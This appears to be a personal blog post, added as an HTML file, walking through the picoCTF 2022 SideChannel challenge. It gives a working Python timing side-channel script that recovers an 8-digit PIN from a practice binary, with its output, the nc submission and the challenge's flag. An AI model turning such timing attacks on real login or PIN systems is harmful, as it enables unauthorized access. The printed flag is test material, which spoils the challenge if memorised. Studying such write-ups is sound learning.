@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>picoCTF 2022 SideChannel Writeup - Jett&#39;s blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="PicoCTF 2022 forensics problem SideChannel writeup" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="picoCTF 2022 SideChannel Writeup" />
+<meta property="og:description" content="PicoCTF 2022 forensics problem SideChannel writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/sidechannel/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-08T19:16:29+08:00" />
+<meta property="article:modified_time" content="2022-04-08T19:16:29+08:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="picoCTF 2022 SideChannel Writeup"/>
+<meta name="twitter:description" content="PicoCTF 2022 forensics problem SideChannel writeup"/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css" rel="stylesheet">
+	
+	<script async defer data-website-id="2fb8ef9e-0de8-4211-920f-906c236ffb58" src="https://analytics.jettchen.me/umami.js"></script>
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.40ca3a860425083862b7ebd55447caec5c4384573f0cb098b8d06a91e8dace2e.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css" media="(prefers-color-scheme: dark)"  />
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Jett&#39;s blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/contact">Contact</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">picoCTF 2022 SideChannel Writeup</h1>
+			<div class="meta">Posted on Apr 8, 2022</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="the-problem">The problem</h2>
+<p><img src="https://s2.loli.net/2022/04/08/y8qCUfcs6dx4WpV.png" alt="">
+<a href="https://play.picoctf.org/practice/challenge/298?category=4&amp;originalEvent=70&amp;page=1">link to the problem</a></p>
+<h3 id="hints">Hints</h3>
+<ol>
+<li>Read about &ldquo;timing-based side-channel attacks.&rdquo;</li>
+<li>Attempting to reverse-enginner or exploit the binary won&rsquo;t work</li>
+<li>Run the attacks against the <code>pin_checker</code> binary</li>
+</ol>
+<h2 id="solution">Solution</h2>
+<h3 id="running-the-binary">Running the binary</h3>
+<p>A problem that would likely occur when solving this problem is running the binary.</p>
+<p>The binary provided by picoCTF is not compatible with my local machine(Macbook).
+However, the binary could be easily executed within picoCTF&rsquo;s webshell.</p>
+<p>First, download the binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget https://artifacts.picoctf.net/c/149/pin_checker<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>chmod +x ./pin_checker <span style="color:#75715e">#give permission to run the binary</span>
+</span></span><span style="display:flex;"><span>./pin_checker <span style="color:#75715e">#run the pin checker binary</span>
+</span></span></code></pre></div><p>A prompt for an 8 digit code should be shown:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Please enter your 8-digit PIN code:
+</span></span><span style="display:flex;"><span>11111111
+</span></span><span style="display:flex;"><span>8
+</span></span><span style="display:flex;"><span>Checking PIN...
+</span></span><span style="display:flex;"><span>Access denied.
+</span></span></code></pre></div><h3 id="timing-based-side-channel-attack">Timing based side channel attack</h3>
+<p>In hint 1, we can see that we&rsquo;re supposed to look up &ldquo;timining based side channel attack&rdquo;</p>
+<p>After some digging on the internet, you&rsquo;ll find that timing based side channel attacks refers to the behavior of certain programs where the timing of execution is different based on different inputs.</p>
+<p>Suppose the pin checking function in our pin checker is implemented as the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(PIN, inp):
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> len(PIN) <span style="color:#f92672">!=</span> len(inp):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(PIN)):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(PIN[i]<span style="color:#f92672">!=</span>inp[i]]):
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><p>This function will execute for a longer time if the match between user input and the correct PIN is longer.</p>
+<p>Thus, we can write a simple script to verify this vulnerbility.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span>TEST_COUNT <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>CHOICES <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789&#34;</span>
+</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> CHOICES:
+</span></span><span style="display:flex;"><span>  cur <span style="color:#f92672">=</span> prefix<span style="color:#f92672">+</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">*</span>(LEN<span style="color:#f92672">-</span>len(prefix)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>  foo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(TEST_COUNT): <span style="color:#75715e"># repeat TEST_COUNT times and get the average to improve accuracy</span>
+</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;echo &#39;</span><span style="color:#e6db74">{</span>cur<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; | ./pin_checker &gt; /dev/null&#34;</span>)
+</span></span><span style="display:flex;"><span>    foo <span style="color:#f92672">+=</span> (time<span style="color:#f92672">.</span>time()<span style="color:#f92672">-</span>start)
+</span></span><span style="display:flex;"><span>  avgtime <span style="color:#f92672">=</span> foo<span style="color:#f92672">/</span>TEST_COUNT
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>cur<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>avgtime<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>The results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>00000000: 0.23883512020111083
+</span></span><span style="display:flex;"><span>10000000: 0.2588793277740479
+</span></span><span style="display:flex;"><span>20000000: 0.25079033374786375
+</span></span><span style="display:flex;"><span>30000000: 0.28905391693115234
+</span></span><span style="display:flex;"><span>40000000: 0.4896090030670166
+</span></span><span style="display:flex;"><span>50000000: 0.27194507122039796
+</span></span><span style="display:flex;"><span>60000000: 0.24216597080230712
+</span></span><span style="display:flex;"><span>70000000: 0.268372631072998
+</span></span><span style="display:flex;"><span>80000000: 0.2515885591506958
+</span></span><span style="display:flex;"><span>90000000: 0.25005943775177003
+</span></span></code></pre></div><p>As we can see, guesses starting with &lsquo;4&rsquo; takes significantly longer to execute compared to guesses starting from all the other numbers. The exploit is working.</p>
+<p>Therefore, instead of manually testing this technique for 8 times, we could instead automate this by modifying our program.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> time<span style="color:#f92672">,</span> os
+</span></span><span style="display:flex;"><span>TEST_COUNT <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#75715e"># set this to a lower number for faster results</span>
+</span></span><span style="display:flex;"><span>LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>CHOICES <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(prefix):
+</span></span><span style="display:flex;"><span>  mxtime <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> CHOICES:
+</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> prefix<span style="color:#f92672">+</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;0&#39;</span><span style="color:#f92672">*</span>(LEN<span style="color:#f92672">-</span>len(prefix)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    foo <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(TEST_COUNT): <span style="color:#75715e"># repeat TEST_COUNT times and get the average to improve accuracy</span>
+</span></span><span style="display:flex;"><span>      start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>      os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;echo &#39;</span><span style="color:#e6db74">{</span>cur<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; | ./pin_checker &gt; /dev/null&#34;</span>)
+</span></span><span style="display:flex;"><span>      foo <span style="color:#f92672">+=</span> (time<span style="color:#f92672">.</span>time()<span style="color:#f92672">-</span>start)
+</span></span><span style="display:flex;"><span>    avgtime <span style="color:#f92672">=</span> foo<span style="color:#f92672">/</span>TEST_COUNT
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> avgtime<span style="color:#f92672">&gt;</span>mxtime:
+</span></span><span style="display:flex;"><span>      mxtime <span style="color:#f92672">=</span> avgtime
+</span></span><span style="display:flex;"><span>      res <span style="color:#f92672">=</span> c
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>  prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> check(prefix)
+</span></span><span style="display:flex;"><span>    prefix<span style="color:#f92672">+=</span>c
+</span></span><span style="display:flex;"><span>    print(c)
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Check the final number(do not hide the results)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> CHOICES:
+</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> prefix<span style="color:#f92672">+</span>c
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;------ trying </span><span style="color:#e6db74">{</span>cur<span style="color:#e6db74">}</span><span style="color:#e6db74"> --------&#34;</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;echo &#39;</span><span style="color:#e6db74">{</span>cur<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; | ./pin_checker&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main()
+</span></span></code></pre></div><p>After running the program, you should see the results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>4
+</span></span><span style="display:flex;"><span>8
+</span></span><span style="display:flex;"><span>3
+</span></span><span style="display:flex;"><span>9
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>5
+</span></span><span style="display:flex;"><span>1
+</span></span><span style="display:flex;"><span>------ trying 48390510 --------
+</span></span><span style="display:flex;"><span>Please enter your 8-digit PIN code:
+</span></span><span style="display:flex;"><span>8
+</span></span><span style="display:flex;"><span>Checking PIN...
+</span></span><span style="display:flex;"><span>Access denied.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------ trying 48390513 --------
+</span></span><span style="display:flex;"><span>Please enter your 8-digit PIN code:
+</span></span><span style="display:flex;"><span>8
+</span></span><span style="display:flex;"><span>Checking PIN...
+</span></span><span style="display:flex;"><span>Access granted. You may use your PIN to log into the master server.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------ trying 48390519 --------
+</span></span><span style="display:flex;"><span>Please enter your 8-digit PIN code:
+</span></span><span style="display:flex;"><span>8
+</span></span><span style="display:flex;"><span>Checking PIN...
+</span></span><span style="display:flex;"><span>Access denied.
+</span></span></code></pre></div><p>When checking for the pin <code>48390513</code>, &ldquo;access granted&rdquo; as shown.
+Finally, we can take the pin, and get the flag from the server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#ae81ff">48390513</span> | nc saturn.picoctf.net <span style="color:#ae81ff">53932</span>
+</span></span></code></pre></div><p>The results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Verifying that you are a human...
+</span></span><span style="display:flex;"><span>Please enter the master PIN code:
+</span></span><span style="display:flex;"><span>Password correct. Here&#39;s your flag:
+</span></span><span style="display:flex;"><span>picoCTF{t1m1ng_4tt4ck_18704dda}
+</span></span></code></pre></div><p>thus the flag is <code>picoCTF{t1m1ng_4tt4ck_18704dda}</code></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/picoctf">picoctf</a></li>
+					
+					<li><a href="/tags/ctf-writeups">ctf-writeups</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<script src="https://utteranc.es/client.js"
+        	repo="JettChenT/blog"
+        	issue-term="pathname"
+        	theme="preferred-color-scheme"
+        	crossorigin="anonymous"
+        	async>
+		</script>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/JettChenT" title="GitHub"><i data-feather="github"></i></a><a class="soc" href="https://twitter.com/jettchen5" title="Twitter"><i data-feather="twitter"></i></a></div>
+  <div class="footer-info">
+    2024  © Jett Chen |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
